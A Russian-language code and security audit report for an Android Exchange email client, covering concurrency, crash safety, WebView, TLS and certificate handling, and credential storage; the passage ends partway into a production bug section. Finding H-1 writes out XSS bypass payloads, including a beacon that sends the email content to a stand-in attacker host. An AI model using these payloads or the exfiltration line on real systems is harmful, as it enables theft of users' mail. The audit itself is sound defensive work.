**✅ ИСПРАВЛЕНО (2026-07-01):** `easClientCache` переведён на `ConcurrentHashMap` (единообразно с `AccountRepository` и соседним `accountPingJobs`): `keys.toList()` теперь weakly-consistent (нет `ConcurrentModificationException`), `get`/`computeIfAbsent` атомарны (ручные `synchronized` сняты), лишний `remove` перед `put` в `tryPushFallback` убран (`put` атомарен). `accountHeartbeats`/`maxPingFoldersPerAccount` — только точечный доступ (не итерируются) → оставлены под `synchronizedMap`.

### C. Проверено и признано устойчивым (НЕ находки — для протокола)

- **Concurrency-ядро:** `BootReceiver` — `goAsync()` + `pendingResult.finish()` + `scope.cancel()` в `finally` (корректно); `InitialSyncController` пересоздаёт `syncScope` только при `!isActive` (стр. 88-90) + атомарный CAS `syncingAccounts.add` (стр. 62); `rememberSyncScope` отменяется через `DisposableEffect{onDispose{scope.cancel()}}` (`ComposableUtils.kt:39-41`).
- **Room-миграции 23→42:** полная цепочка из 19 шагов в `ALL_MIGRATIONS`; `fallbackToDestructiveMigration` + флаг `wasDestructivelyMigrated` → авто-resync (для Exchange сервер — источник правды). Целостность сохранена.
- **WBXML-парсер (`WbxmlParser.kt`):** bounds-check (`MAX_OPAQUE_SIZE`/`MAX_STRING_SIZE` = 16 МБ), EOF → `IOException`, гард `tagStack.isNotEmpty()` от underflow на битых данных сервера.
- **XML-экранирование:** `XmlUtils.escape` (порядок `&` первым — верно) применяется ко всем пользовательским полям шаблонов (235 вызовов в 18 файлах). `unescape` — корректный обратный порядок (`&amp;` последним).
- **EAS 12.1 / Exchange 2007 SP1/SP2:** интернет-верифицировано (learn.microsoft.com, MS-ASHTTP): 12.1 введён в SP1, **неизменен в SP2/SP3**. Ветвление `majorVersion < 14` и заголовок `MS-ASProtocolVersion` корректны.
- **PendingIntent:** во всех точках (`PushService`/`NotificationHelper`/ресиверы/`UpdateChecker`/`MainScreen`) присутствует `FLAG_IMMUTABLE` (требование Android 12+).
- **SimpleDateFormat:** где экземпляр разделяется между потоками — `ThreadLocal` (`ComposeUtils.kt:151`, `TasksScreen.kt:55-56`); остальное — локальные `val` или `remember` в Compose. Параметр `dateFormat` в `EasTasksService` (450→503) — корутино-локальный (создаётся на каждый вызов `createTask`, не поле) → безопасен. Shared-mutable бага не найдено.
- **`EasTasksService` (создание/CRUD задач):** экранирование всех полей (`escapeXml` subject/body/syncKey/collectionId/clientId 453-512), `clientId`=UUID, retry на InvalidSyncKey (Status 3/12) с обновлением SyncKey (макс 2 попытки). Корректно по MS-ASCMD.
- **`EasDraftsService` (dual-body черновики):** лимит MIME 25 МБ → graceful `Success("")` (пустое тело, не порча/OOM, 384-387); `updateDraftEws` берёт **свежий ChangeKey** через GetItem прямо перед UpdateItem (867-890) + `ConflictResolution="AlwaysOverwrite"` + `MessageDisposition="SaveOnly"` → нет ошибки stale-ChangeKey, нет потери правок, нет дубля; локальные черновики (`local_draft_`) короткозамкнуты; всё экранируется. Совместимо с Exchange 2007 SP1.
- **`SyncWorker` (периодический sync):** `doWorkMutex.tryLock()` → skip-if-running (37-39, без очереди); `try doWorkInternal catch(Throwable)` (Cancellation проброшен) → `Result.failure`; `finally unlock`; `setForeground` под try/catch (59-64); debounce 30с; бюджет времени делится по аккаунтам (min 60с) < 10-мин лимита WorkManager; пропуск аккаунтов, уже синхронизируемых `InitialSyncController`; `notificationMutex` от гонок уведомлений; `Result.retry` только для авто-sync с ошибками.
- **`OutboxWorker` (файл-очередь):** атомарная запись (temp→`renameTo`, fallback `copyTo`+delete, 141-156); цикл отправки вне лока, финальный merge перечитывает `current` и удаляет только `sentKeys` → письма, добавленные `enqueue()` во время отправки, сохраняются; EXPONENTIAL backoff; MAX_QUEUE_SIZE=100 + prune по возрасту. (Дубль-отправка — N-11.)
- **`CalendarRepository` (удаление событий — data-loss-sensitive):** все мутации под per-account `getSyncMutex().withLock`. `deleteEventPermanently` соблюдает инвариант «сначала сервер»: при ошибке server-delete `return` без локального удаления (872-876); локальное удаление только после подтверждения. Anti-resurrection: участник получает `respondToMeetingRequest("Decline")` ДО удаления (966-972). Идемпотентность: EAS Status 8 / EWS `ErrorItemNotFound` → success (`EasCalendarCrudService.kt:1226/1230/1797`), поэтому `emptyCalendarTrash` самовосстанавливается при частичном сбое. 2-й уровень anti-resurrection — serverIds из БД `isDeleted=1` (1245) переживает потерю `DeletedIdsTracker`. Соответствует MS-ASCMD/ARCHITECTURE §9.
- **Календарь/таймзоны (`CalendarDateUtils.kt`):** `buildDeviceTimezoneBlob` строит 172-байтный Windows `TIME_ZONE_INFORMATION` с точной раскладкой полей (4+64+16+4+64+16+4); маппинг `DayOfWeek.value % 7` верно конвертирует java.time MON=1..SUN=7 → Windows SUN=0..SAT=6; all-day → UTC-midnight нормализуется корректно. Соответствует MS-ASDTYPE 2.2.7.
- **Email move/delete (`EmailOperationsService.kt`):** инвариант «сначала сервер, потом локально» соблюдён (`moveToTrash`: drafts→server-delete с fallback в move, in-trash→permanent, regular→`originalFolderId`+server move; permanent-delete по подтверждению сервера). Устаревшие ID обрабатываются (stale → чистка вложений без краша).
- **Цикл sync (`EmailSyncService.syncEmailsEas` 530-780):** concurrency-гард `activeSyncs.putIfAbsent` + `withTimeoutOrNull(30s)` корректно исключает двойной sync; рекурсивный retry на Status 3/12 переиспользует запись гарда (внутренний `finally` снимает её идемпотентно); `SyncKey` сохраняется ТОЛЬКО после обработки батча (идемпотентно при краше); удаление orphan'ов gated на `syncLoopCompletedFully` (не удалит валидные письма при обрыве). `yield()` каждую итерацию + лимиты `maxIterations`/`sameKeyCount`/`emptyDataCount`/таймаут.
- **Рекуррентность (`RecurrenceHelper.kt`):** клампинг дня месяца `minOf(targetDay, getActualMaximum(DAY_OF_MONTH))` (Feb-31→Feb-28 верно), `safetyCounter < MAX_OCCURRENCES`, skip-ahead — только оптимизация (корректность через фильтр `>= rangeStart`).
- **`!!`-дисциплина:** все `!!` под non-null гардами (`att.contentId!!` после `filter { it.isInline && !it.contentId.isNullOrBlank() }`; `fwdFolderId!!`/`fwdItemId!!` под `isSmartForward`; `editingOccurrenceStartTime!!` под `if (… != null)`). В `EmailDetailScreen`/`MainScreen` `!!` сознательно заменён на `let{}`/smart-cast от race в рекомпозиции.
- **`extractHtmlFromMime`:** правильно централизован в `MimeHtmlProcessor` (общий для протокольного и UI путей) — в отличие от извлечения картинок (N-5).
- **Календарь CRUD (`EasCalendarCrudService.kt`):** все пользовательские поля экранируются — Subject/Body/Location (1308/1311/1324) и **email участников** (`deps.escapeXml(email.trim())` — EAS 974, EWS 1276). XML-инъекция через встречу невозможна. Ветвление EAS 14+/EWS для Exchange 2007 SP1 (SetItemField не поддерживается → AppendToItemField).
- **`ComposeScreen` state:** `derivedStateOf` для валидации получателей (123-126, пересчёт только при изменении входа), вложения хранятся как saveable-строки/URI (не байты) до отправки, `DisposableEffect{onDispose}` очистка. Валидация cc/bcc в UI (`isCcValid`/`isBccValid` → `areRecipientsValid`) подтверждает митигацию N-1.
- **DAO-проекции (`Daos.kt`):** список писем читает body-less `getEmailSummariesByFolder` (проекция `'' AS body`, стр. 207-216) → тела не грузятся в список; есть пагинация (`getEmailsByFolderPaged` LIMIT/OFFSET), `search` c `LIMIT 500`, widget/dedup-проекции. Полные тела (`getEmailsByFolderList`) — только для черновиков (малый объём). Грамотная работа с памятью.
- **`PushService` (Direct Push):** ping-цикл устойчив — `CoroutineStart.LAZY`+`oldJob.join()` исключает наложение пингов; anti-spin (quick-ping 3× → `pingNotSupported`→alarm, min-5s пауза); адаптивный heartbeat по MS-ASCMD (Status 5 out-of-bounds→÷2, Status 6 too-many-folders→снижение папок); error/`catch(Throwable)` — bounded `consecutiveErrors` с backoff 10s→30s + `tryPushFallback`→alternate + терминальный fallback на alarm; `CancellationException` проброшен; `onDestroy` отменяет все jobs+scope; FGS-тип `DATA_SYNC`, network-aware (пауза при потере сети).

- **Манифест/конфиги/gradle (best-practice, корректно):** `allowBackup="false"` + backup/data-extraction правила исключают `sharedpref`+`database` (пароли/БД не бэкапятся); `exported` корректно (все ресиверы кроме требуемых `BOOT`/widget — `false`; `PushService`/FileProvider — `false`); `foregroundServiceType="dataSync"` + разрешение `FOREGROUND_SERVICE_DATA_SYNC`; NSC `cleartextTrafficPermitted="false"`; R8 `isMinifyEnabled`+`isShrinkResources` для release; Room `schemaLocation` экспорт; ABI splits; JDK 17. Проблемы конфигов вынесены в N-12/N-13/N-14.
- **Оставшиеся eas-сервисы (crash-sweep):** `EasContactsService`/`EasNotesService`/`EasCalendarSyncService`/`CalendarExceptionService`/`CalendarXmlParser` — нет небезопасных `.toInt()`/`.first()`/`.substring()`/`!!` (единственный `probeNewKey!!` в `EasContactsService:93` под `if (… != null)`); нет неэкранированной интерполяции пользовательских полей в XML. `ImapClient`/`Pop3Client` (beta) — тонкие обёртки над JavaMail без ручного парсинга. Footgun-свип по всему проекту — чисто.

### D. Покрытие и что осталось

**Полностью прочитаны:** `data/database` (`MailDatabase`+миграции, entities), `WbxmlParser`, `XmlUtils`, `EwsClient`, `EasTransport` (EWS-часть), `HtmlUtils`, `RepositoryProvider`, `HttpClientProvider` (cert/TLS), `AccountRepository` (ключевые секции), 5 ViewModel (Notes/Search/Tasks/UserFolders/SyncCleanup), `EmailDetailScreen` (WebView), `RichTextEditor` (WebView), `BootReceiver`, `InitialSyncController`, `EasXmlTemplates` (MIME-сборка), `EasEmailService` (отправка), `CalendarDateUtils` (таймзоны), `EmailOperationsService` (move/delete/permanent), `EmailSyncService` (цикл sync 530-780), `RecurrenceHelper` (генерация вхождений), `MimeHtmlProcessor`, `EasClient` (структура + ключевые методы), `ComposeScreen` (send/state/lifecycle), `MainScreen` (lifecycle/эффекты), `EasCalendarCrudService` (CRUD/экранирование), `AccountRepository` (кэш EasClient), `PushService` (ping-цикл/foreground/heartbeat), `Daos` (проекции/пагинация), `EasTasksService` (create/CRUD), `CalendarRepository` (delete/permanent/anti-resurrection), `EasDraftsService` (dual-body/ChangeKey), `SyncWorker`/`OutboxWorker`, `ServiceWatchdogReceiver`, `AndroidManifest.xml`/`build.gradle.kts`/NSC/backup-rules/`file_paths.xml`. Footgun-свип (`!!`/`first`/`toInt`/`readBytes`/scope/PendingIntent/SimpleDateFormat/collectAsState) — по всему проекту.

**Свипнуты (crash-паттерны), не деталь-читаны:** `EasContactsService`/`EasNotesService`/`EasCalendarSyncService`/`CalendarExceptionService`/`CalendarAttachmentService`/`CalendarXmlParser`, `MailRepository` (делегация), `FolderSyncService`, `ImapClient`/`Pop3Client` (beta).

**Прочитан (2026-07-01):** наэкранный виджет — `widget/MailWidget.kt` (Glance, 706 строк), `WidgetConfigActivity.kt`, `res/xml/mail_widget_info.xml`, манифест-регистрация. См. раздел «Аудит наэкранного виджета» (W-1…W-4 + проверенное).

**Не читаны (низкий риск — presentation/строки):** UI-экраны настроек/контактов/онбординга (`SetupScreen`/`AccountSettingsScreen`/`SettingsScreen`/`PersonalizationScreen`/`OnboardingScreen`/`VerificationScreen`/`UpdatesScreen`), `Localization` (ресурсы строк). Рекомендуется отдельный UX/перф-проход по рекомпозиции этих экранов при желании.

---

## HIGH

### H-1. WebView письма исполняет JS из недоверенного HTML → XSS / эксфильтрация содержимого

> ⚠️ **ПЕРЕСМОТРЕНО 2026-07-01 → Low.** Эта находка опирается на неверную посылку «единственный барьер — regex». В `EmailDetailScreen.kt:1691` уже инжектится CSP `script-src 'nonce-…'`, который блокирует описанные ниже векторы. Текст ниже сохранён как есть; актуальный разбор — в разделе «Повторная углублённая верификация → A».

**Где:** `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/screens/EmailDetailScreen.kt:1563`
(плюс `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/util/HtmlUtils.kt:89` — санитайзер)

**Суть:**
- WebView, в который грузится **полностью контролируемый отправителем HTML письма**, имеет `javaScriptEnabled = true` (нужен лишь для замера высоты через `evaluateJavascript` в `onPageFinished`, строки 1654-1672).
- Единственный барьер — `sanitizeEmailHtml()` на regex. Regex-санитизация HTML имеет известные обходы:
  - Обработчики событий без пробела перед атрибутом: `<img/onerror=alert(1) src=x>` — паттерн `\s+on\w+` требует пробел, `/` его не даёт → **не вырезается**.
  - Entity-кодирование схемы: `href="&#106;avascript:..."` — литерал `javascript:` не матчится → **не вырезается**; WebView декодирует сущность и исполняет.
- `shouldOverrideUrlLoading` перехватывает только **навигации** (клики/`window.location`), но НЕ subresource-запросы. Поэтому даже при `loadDataWithBaseURL(null, ...)` авто-исполняемый JS (`onerror`/`onload`) может выгрузить тело письма маяком: `new Image().src = "https://attacker/?d=" + encodeURIComponent(document.documentElement.innerHTML)`. CORS не мешает GET-маяку.

**Почему это важно:** HTML письма — недоверенный вход. JS исполняется **без действий пользователя** (авто-срабатывание `onerror`). Возможна утечка содержимого письма и манипуляция UI.

**Рекомендация (по убыванию надёжности):**
1. Отключить JS для рендеринга письма (`javaScriptEnabled = false`) и замерять высоту без JS (`WebView.contentHeight` после `onPageFinished`, либо `WRAP_CONTENT` + `ViewTreeObserver`). JS включён ТОЛЬКО ради замера — это устранимо.
2. Дополнительно внедрять CSP через инжект `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data: cid: https:; style-src 'unsafe-inline'">` в `<head>` перед загрузкой — блокирует и инлайн-JS, и `connect-src` эксфильтрацию даже при включённом JS.
3. (Если оставлять regex) — это лишь defense-in-depth, основной барьер должен быть на уровне WebView.

---

## MEDIUM

### M-1. Паттерн crash-resistance применён не ко всем ViewModel

**Где:**
- `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/screens/NotesViewModel.kt` — `saveNote`, `deleteNoteToTrash`, `deleteSelectedToTrash`
- `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/screens/SearchViewModel.kt:150` — `deleteSelected`, `markSelectedAsRead`, `starSelected`
- `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/screens/TasksViewModel.kt:283` — `saveTask`, `toggleComplete`, `deleteToTrash`, `deleteSelectedToTrash`
- `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/screens/UserFoldersViewModel.kt` — `createFolder`, `renameFolder`, `deleteFolder`, batch-delete
- `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/screens/SyncCleanupViewModel.kt` — все `set*`

**Суть:** `ARCHITECTURE.md` §10 документирует обязательный паттерн `viewModelScope.launch { try { … } catch (CancellationException) { throw } catch (Exception) { sendEvent(Error) } }`, т.к. `viewModelScope` использует `SupervisorJob` без `CoroutineExceptionHandler` — любое непойманное исключение в `launch` крашит приложение. Паттерн реально применён только в `EmailListViewModel` и `EmailDetailViewModel` (все mutation-функции защищены). В перечисленных VM `sync`/`search` защищены, но **mutation-функции — нет**. Внутрифайловая несогласованность (`runSync` в `try/catch`, мутации — без) указывает на незавершённую работу.

**Риск:** репозитории возвращают `EasResult` (ловят внутри), но при `SQLiteException`/`IllegalStateException`/OOM до возврата результата корутина уронит процесс.

**Рекомендация:** обернуть mutation-launch в тот же паттерн, что в `EmailListViewModel`. Минимальные точечные правки, без изменения логики.

### M-2. Нарушение DRY: `ContactRepository` создаётся в обход `RepositoryProvider`

**Где:**
- `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/screens/ContactsScreen.kt:74`
- `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/screens/ComposeScreen.kt:320`
- `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/sync/InitialSyncController.kt:322`

**Суть:** есть `RepositoryProvider.getContactRepository()` (кэширующий singleton), но в трёх местах создаётся `ContactRepository(context)` напрямую. В том же `ContactsScreen` соседний `AccountRepository` берётся через провайдер — налицо несогласованность.

**Не утечка:** `ContactRepository` использует `applicationContext` через singleton `MailDatabase`, поэтому Activity-контекст не удерживается. Это именно нарушение DRY/единообразия, не leak.

**Рекомендация:** заменить на `RepositoryProvider.getContactRepository(context)`.

**✅ ИСПРАВЛЕНО (2026-07-01):** все 3 вызова переведены на `RepositoryProvider.getContactRepository(context)`; неиспользуемые импорты `ContactRepository` удалены из `ContactsScreen`/`ComposeScreen`. Поведение идентично (тот же singleton на `applicationContext`).

### M-3. EWS NTLM-хендшейк сериализуется глобальным `synchronized` с блокирующей сетью

**Где:** `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/eas/EwsClient.kt` — `executeNtlmHandshake` (`synchronized(ntlmLock)` + блокирующий `call.execute()`).

**Суть:** все EWS-NTLM запросы аккаунта проходят через один лок, при этом сетевой вызов блокирующий. Сериализует параллельные EWS-операции и занимает поток `Dispatchers.IO` на время сети.

**Влияние:** низкое — EWS это fallback-путь (Exchange 2007: календарь/заметки/задачи). Не корректность, а пропускная способность.

**Рекомендация:** при желании — сузить критическую секцию до кэширования challenge или перейти на неблокирующий `enqueue` как в `EasTransport.executeRequest`. Не критично.

---

## LOW

### L-1. Мёртвый код: `clearAllEasClientCache()`
`@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/data/repository/AccountRepository.kt` — метод нигде не вызывается (grep по проекту). Замечание прошлой сессии про «не чистит `fallbackTimestamps`» формально верно, но не достижимо. Удалить либо использовать.

**✅ ИСПРАВЛЕНО (2026-07-01):** метод удалён.

### L-2. Мёртвый код: `RepositoryProvider.clear()`
`@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/data/repository/RepositoryProvider.kt` — 0 вызовов. Удалить либо задействовать при смене аккаунта/logout.

**✅ ИСПРАВЛЕНО (2026-07-01):** метод удалён. Репозитории — app-wide singletons на `applicationContext` (не per-account), поэтому очистка при смене аккаунта/logout не требуется.

### L-3. Вторичный WebView с JS в `RichTextEditor`
`@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/ui/components/RichTextEditor.kt:1072` — `javaScriptEnabled = true` и `addJavascriptInterface(jsInterface, "Android")`. При Reply/Forward в редактор попадает цитируемый недоверенный HTML.
Смягчено: `allowFileAccess=false`, `allowContentAccess=false`, а экспонируемый интерфейс (`onFormatStateChanged`) лишь обновляет состояние тулбара — без файлов/системного доступа. Поверхность ниже, чем у H-1, но JS на недоверенном контенте остаётся. Стоит санитизировать цитируемый HTML перед загрузкой и/или применить CSP (как в H-1).

### L-4. `deleteDuplicateEmails` — потенциальное удаление легитимных писем
`@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/data/database/Daos.kt:592` — `DELETE … WHERE id NOT IN (SELECT MIN(id) … GROUP BY folderId, subject, from, dateReceived)`. Два разных письма с совпадающими subject+from+dateReceived(секунда) в одной папке → одно удалится. Риск низкий: запуск однократный под флагом `duplicates_cleaned_v35`. При повторном использовании добавить в ключ группировки серверный `id`/`internetMessageId`.

**✅ ИСПРАВЛЕНО (2026-07-01):** ключ переведён на `GROUP BY folderId, internetMessageId` (канонический RFC 5322 Message-ID — глобально уникален, распознаёт только настоящие дубли). Письма с `internetMessageId` NULL/пусто исключены из группировки И из удаления (`WHERE internetMessageId IS NOT NULL AND != ''`) — не трогаются вовсе. Флаг `duplicates_cleaned_v35` НЕ бампался: на существующих установках очистка уже отработала, правка лишь устраняет латентный дефект логики дремлющего запроса (повторный прогон не нужен и не запускается).

### L-5. Кастомный серверный сертификат: отключение hostname-проверки + fallback на системный trust
**Где:** `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/network/HttpClientProvider.kt:360` (hostnameVerifier off при `certificatePath != null`) и `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/network/HttpClientProvider.kt:444` (`checkServerTrusted` → fallback на `certTm`/`systemTm`).

**Суть:** в режиме импортированного серверного сертификата hostname-проверка выключается, а `checkServerTrusted` при несовпадении pinned-серта откатывается на системный trust. Комбинация «hostname off + system-fallback» означает: MITM с любым валидным CA-сертификатом (на любой домен) пройдёт, т.к. имя хоста не сверяется. Это opt-in путь (пользователь сам импортировал серт самоподписанного Exchange), поэтому риск ограничен, но шире необходимого.

**Рекомендация:** при наличии pinned-серта НЕ откатываться на системный trust (строгий пиннинг), либо сохранять hostname-проверку. Не трогать `acceptAllCerts` (явно небезопасный режим по выбору пользователя).

### L-6. TLS 1.0/1.1 и все cipher suites включены глобально (by-design для Exchange 2007 SP1)
**Где:** `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/network/HttpClientProvider.kt:593` (`preferredProtocols` включает `TLSv1`) и `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/network/HttpClientProvider.kt:637` (`enabledCipherSuites = supportedCipherSuites`).

**Суть:** для совместимости с Exchange 2007 SP1 (bundled Conscrypt, TLS 1.0) включаются устаревшие протоколы и весь набор шифров — это ослабляет и современные соединения. Осознанный компромисс ради заявленной цели приложения. Информационно; при желании — включать TLS 1.0/слабые шифры только как fallback на конкретный сервер, а не глобально.

### L-7. Fallback-хранилище паролей использует обратимую XOR-обфускацию
**Где:** `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/data/repository/AccountRepository.kt:60` (catch → `ObfuscatedSharedPreferences`) и реализация `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/data/repository/AccountRepository.kt:1041`.

**Суть:** основной путь — `EncryptedSharedPreferences` (MasterKey AES256_GCM, Android KeyStore) — корректен и является best practice; пароль НЕ хранится в БД. Но при сбое инициализации (повреждённый KeyStore, частый кейс после restore/обновления ОС) пароли пишутся в `ObfuscatedSharedPreferences` — XOR ключом `SHA-256("iwomail_obf_v1_" + ANDROID_ID)`. Это обфускация, не шифрование: при доступе к файлу + знании ANDROID_ID (доступен приложению/при root/ADB-backup) пароль восстанавливается тривиально. В коде это честно задокументировано.

**Влияние:** низкое — путь редкий (только при сломанном KeyStore), и всё равно лучше plaintext. **Рекомендация:** рассмотреть fail-closed (требовать повторный ввод пароля без записи в слабое хранилище) либо явное уведомление пользователя о деградации защиты.

---

## UI-аудит (2026-07-01) — баги/краши/гонки/утечки/перф в интерфейсе

Свип всего UI-кода (`ui/**`) на footgun-паттерны. Кодовая база защитная — большинство паттернов проверено безопасными; найдены 2 находки, обе исправлены.

### UI-1 (Medium→High для zero-crash). Некошенные краши в legacy (не-MVVM) экранах.
**Суть:** немигрированные экраны запускают операции через `rememberCoroutineScope().launch { … }` **без try/catch**, вызывая бросающие suspend-функции (сырой Room/DAO, файловый I/O). Некошенное исключение в scope → отмена родителя → **краш приложения** (блокировка/повреждение БД, ошибка I/O). Тот же класс, что M-1, но для legacy-экранов вне MVVM. Дополнительно: `rememberSyncScope` имел `SupervisorJob` **без** `CoroutineExceptionHandler` → соседи изолированы, но сам краш не ловится (интернет-верифицировано: нужны ОБА — [Kotlin docs](https://kotlinlang.org/docs/exception-handling.html)).

**Подтверждённые точки:** `ContactsScreen` (`deleteContact`/`updateContact` → `contactDao.delete/update`), `SettingsScreen` (`accountRepo.deleteAccount`, `signatureDao().delete`), `CalendarScreen` (`deleteEvent/deleteEvents/emptyCalendarTrash`), `MainScreen`, `AccountSettingsScreen` и др. Масштаб: 27 `val scope = rememberCoroutineScope()` в 17 файлах.

**✅ ИСПРАВЛЕНО (2026-07-01):** введён крах-безопасный `rememberSafeScope()` (`ComposableUtils`) — `SupervisorJob(base.Job)` (изоляция соседей + жизненный цикл композиции) + `CoroutineExceptionHandler` (не крашит, логирует). Handler срабатывает, т.к. `launch` — прямой child SupervisorJob-scope (это НЕ ловушка `launch(SupervisorJob())`; интернет-верифицировано). Все 27 экранных `rememberCoroutineScope()` → `rememberSafeScope()`; `rememberSyncScope` получил `CoroutineExceptionHandler`. Тела `scope.launch{}` не менялись (нет проблемы `return@launch`). Drag-scroll scope в `ComposableUtils` (чисто UI, не бросает) оставлен.

**Схожая проблема (тот же класс, вне UI) — ✅ ИСПРАВЛЕНО (2026-07-01):** те же ручные `CoroutineScope(SupervisorJob() + dispatcher)` **без `CoroutineExceptionHandler`** обнаружены в долгоживущих не-UI scope'ах — `MailApplication.applicationScope` (реально некошеные launch: `cleanupOldAttachments`, `initCacheFromDb`), `PushService.serviceScope` (`language.collect → updateForegroundNotification`), `SettingsRepository.cacheScope`, `InitialSyncController.syncScope`, ресиверы `Boot`/`SyncAlarm`/`TaskReminder`/`CalendarReminder`/`ServiceWatchdog`, прогресс-бары `Send`/`Deletion`. Все переведены на единый `supervisedScope(dispatcher, tag)` (`util/AppCoroutines.kt`): `SupervisorJob` (изоляция соседей) + `CoroutineExceptionHandler` (ловит `Exception` И `OutOfMemoryError` → лог вместо краша процесса/сервиса; интернет-верифицировано — нужны ОБА). `GlobalScope`/`runBlocking` в проекте нет. Тест `AppCoroutinesTest` (сбой не отменяет соседей и не пробрасывается).

**CR-2 (тот же класс — `viewModelScope`, вне UI) — ✅ ИСПРАВЛЕНО (2026-07-01):** `viewModelScope` = `SupervisorJob() + Dispatchers.Main.immediate` **без handler'а** (интернет-верифицировано, androidx lifecycle) → некошеное исключение в `launch` крашит процесс. Мигрированные VM полагаются на inline `try/catch` в mutation-функциях (M-1), но **реактивные observe-launch'и** (`accountRepo.activeAccount…collectLatest { … .collect { … } }` в `EmailDetail`/`UserFolders`/`EmailList`/`Notes`/`Tasks`) были без обёртки → ошибка Room-Flow в `collect` = краш. Фикс: `viewModelScope.launch(loggingExceptionHandler("…")) { … }` (`util/AppCoroutines.kt`) — handler ловит все некошеные исключения этого launch (прямой child SupervisorJob-scope; интернет-верифицировано). Вложенные `launch { runSync/maybeAutoSync }` уже с внутренним `try`. Тест в `AppCoroutinesTest`.

### UI-2 (Low, перф/идентичность). LazyColumn `items()` без `key`.
`ContactsScreen:1143`, `ContactListViews:112` (группы), `EmailListScreen:433` (папки переноса) — `items(list) {}` без `key` → при изменении списка Compose не отслеживает идентичность (неверная рекомпозиция item-local state/анимаций). **✅ ИСПРАВЛЕНО:** добавлен `key = { it.id }` (как в остальных списках проекта).

### Проверено и БЕЗОПАСНО (не находки)
- **Крах-парсинг:** цвет RichTextEditor (`try` + гарды `values.size`), `ComposeModels.fromSaveableString` (`parts.size!=4` + try), прогресс-бары (`steps`=const, в `try`) — защищены.
- **Коллекции:** `.first()`/`.first{}` в Compose/Tasks/MainScreen/AgendaView гардированы (`isNotEmpty`/`size==1`/`groupBy` → непустые группы).
- **WebView:** EmailDetailScreen и RichTextEditor — образцовое уничтожение (`stopLoading`→`about:blank`→`removeAllViews`→`destroy` + обнуление `controller.webView`; обход RenderThread-краша). Утечек нет.
- **Потокобезопасность:** `SimpleDateFormat` — `remember{}` (Main-thread) / `ThreadLocal` / per-call функции. `GlobalScope`/`runBlocking` в UI — НЕТ. `DisposableEffect` (9) — все с `onDispose`.

### Не покрыто (рекомендуется отдельным проходом)
Тонкие логические гонки (двойной submit при быстрых тапах — частично митигируется флагами `isLoading`/`rememberSaveable`) и перф-рекомпозиция (стабильность лямбд, уровень чтения state). Не крэш-класс; ниже приоритетом.

---

## Прод-баги по репортам (2026-07-01)

### PB-1. Скачивание вложений: fallback возвращал ВСЁ письмо как «вложение».
**Симптом (репорт):** ошибка «Сервер не поддерживает скачивание вложений через EAS» иногда; повреждённые загрузки.
**Найдено:** `EasAttachmentService.downloadViaItemOperationsFetchEmail` — TODO извлечения вложения из MIME по `FileReference` НЕ реализован; функция возвращала весь MIME письма как данные вложения → при провале прямого Fetch пользователь скачивал повреждённый файл (всё письмо вместо вложения). **✅ ИСПРАВЛЕНО:** broken-fallback удалён (функция + осиротевший шаблон `itemOperationsFetchEmail`); скачивание идёт по корректным путям — ItemOperations Fetch по `FileReference` ([MS-ASCMD Fetch](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-ascmd/7782504c-43f2-4cef-9147-2d61ce8aa4e3)) → GetAttachment → ошибка. `collectionId`/`serverId` сохранены для будущей корректной реализации (parse MIME → extract by FileReference).
**Интермиттентность самой ошибки (нужны логи сервера для точечного фикса):** по MS-ASCMD вероятные причины — (а) **stale `FileReference`** после ре-синка (клиент ОБЯЗАН хранить FileReference из Sync/Search; после ре-синка старый → `ObjectNotFound`); (б) транзиентные (`ServerErrorRetryLater`/таймаут) без ретрая; (в) **EAS per-user budget-троттлинг** от «шотгана» (до 8 запросов на одно скачивание: 3 XML-варианта × 2 ref + fetchEmail + getAttachment) — агрессия сама провоцирует троттлинг/бан устройства. Рекомендация: сузить шотган + один консервативный ретрай ТОЛЬКО транзиентных (не постоянных `ObjectNotFound`/`AttachmentTooBig`/Status 2) — после подтверждения типа ошибки по логам.

### PB-2. Краш при открытии «тяжёлых» писем (гипотеза OOM).
**Симптом (репорт):** краш при попытке открыть/удалить некоторые письма во входящих.
